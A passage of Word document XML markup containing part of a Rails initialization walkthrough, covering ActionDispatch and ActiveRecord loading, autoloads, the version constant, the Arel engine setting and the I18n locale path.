        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module. After </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, there’s autoloads defined for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch::Http</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch::Session</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. A new method called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>autoload_under</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is used here, and this simply prefixes the files where the modules are autoloaded from with the path specified. For example here:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3168"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4206D61A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39561975" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>autoload_under 'testing'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="371B6A3B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  autoload :Assertions</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31C73346" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>...</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1B507CD6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Assertions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module is in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch/testing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> folder rather than simply </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D1EBF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Finally, this file defines a top-level autoload, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Mime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="055654DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.44 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activesupport/lib/action_dispatch/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C01D4E2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is required in this file, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class is defined and is yet another class that inherits from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This class defines some initial configuration option defaults for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.action_dispatch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> before setting up a single initializer called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch.configure</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D50C9F4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch/railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> now complete, we go back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F60660A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.45 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203763A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With the Active Support and Action Dispatch railties now both loaded, the rest of this file deals with setting up </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>UTF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-8 to be the default encoding for Rails and then finally setting up the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module. This module defines useful methods such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails.logger</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails.application</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails.env</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails.root</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F6C53A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.46 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/all.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F90775" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is required, the remaining railties are loaded next, beginning with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_record/railtie</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C9FCEA0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.47 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activerecord/lib/active_record/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C68FA9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Before this file gets into the swing of defining the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class, there are a couple of files that are required first. The first one of these is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_record</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018247CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.48 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activerecord/lib/active_record.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E092B2E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file begins by detecting if the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directories of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are not in the load path and if they aren’t then adds them. As we saw back in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch.rb</w:t>
      </w:r>
      <w:r>
        <w:t>, these directories are already there.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40CA8E41" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The first three requires have already been done by other files and so aren’t loaded here, but the 4th require, the one to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>arel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will require the file provided by the Arel gem, which defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Arel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2F4663EC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="35C03373" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29828278" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/i18n'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0ED3F835" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_model'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74E5CF16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'arel'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A7421FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The 5th require in this file is one to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_record/version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which defines the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::VERSION</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> constant:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7128"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="519FEA4C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1448A4CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveRecord</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="41E727A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>VERSION</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#:nodoc:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5BE95A68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    MAJOR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="223E23B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    MINOR</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44ED1ED0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    TINY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57C3EAA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    PRE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">   </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= "beta"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="120DE163" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="398C48D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    STRING</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= [MAJOR, MINOR, TINY, PRE].compact.join('.')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55D32A95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2115851A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EEC33C2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Once these requires are finished, the base for the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> module is defined along with its autoloads.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468A84A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Near the end of the file, we see this line:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="181D0179" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B0EBE5F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActiveSupport.on_load(:active_record) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FAA30F6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  Arel::Table.engine = self</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F24F6CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2BCE411F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will set the engine for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Arel::Table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A504A6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The file then finishes with this line:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="14855783" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2FB02B99" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="560561403"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.load_path &lt;&lt; File.dirname(__FILE__) + '/active_record/locale/en.yml'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A7B08A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will add the translations from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activerecord/lib/active_record/locale/en.yml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the load path for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>I18n</w:t>
      </w:r>
      <w:r>
        <w:t>, with this file being parsed when all the translations are loaded.</w:t>
      </w:r>
    </w:p>
